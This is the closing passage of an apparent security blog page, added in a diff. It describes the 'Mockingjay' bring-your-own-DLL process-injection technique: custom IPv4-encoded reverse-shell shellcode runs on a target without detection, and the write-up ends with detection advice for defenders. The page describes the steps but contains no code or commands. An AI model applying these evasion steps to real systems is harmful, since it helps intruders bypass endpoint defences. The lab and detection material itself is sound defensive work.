+<li><a href="https://h0mbre.github.io/Win32_Reverse_Shellcode/">https://h0mbre.github.io/Win32_Reverse_Shellcode/</a></li>
+<li><a href="https://github.com/Cracked5pider/ShellcodeTemplate">https://github.com/Cracked5pider/ShellcodeTemplate</a></li>
+</ul>
+<p>We then create a custom reverse shell shellcode and IPV4 encode it, just like we did with Metasploit. Compile the project, send it to the target, and execute:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img08.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>This time, no detections.
+We receive our reverse shell call in the attacker machine:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img09.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Side by side target(left) and attacker(right) machines during execution:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img10.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can conclude that the Mockingjay technique is very evasive, but also that even if the target machine does not have Visual Studio installed, or at least one DLL in the disk with the default RWX sections, it is still possible for attackers to bring their own DLL and exploit.</p>
+<doc-anchor-target id="opportunities-for-detection">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#opportunities-for-detection">#</doc-anchor-trigger>
+        <span>Opportunities for detection</span>
+    </h2>
+</doc-anchor-target>
+<p>There are plenty of opportunities for detection in this technique.</p>
+<ul>
+<li>To start off don’t rely on just out-of-the-box detection rules, use of behavioral analysis and machine learning techniques to identify process injection.</li>
+<li>Create a list of DLLs that contain RWX sections and monitor their use.</li>
+<li>Monitor for unusual processes loading a DLL with RWX sections. In this case, a DLL was downloaded from internet and saved to disk, then loaded back to the process, look for this characteristics.</li>
+</ul>
+<p>For more information about Mockingjay I recommend reading the original article published by Security Joes:</p>
+<ul>
+<li><a href="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution">https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution</a></li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../purple-team-lab/elasticonraspberrypi/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Deploy Elastic on Raspberry Pi</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../windowsprivesc/big-checkl-6737d/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Big Checklist</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2023. Caue All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Mockingjay - BYODLL", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+</body>
+</html>
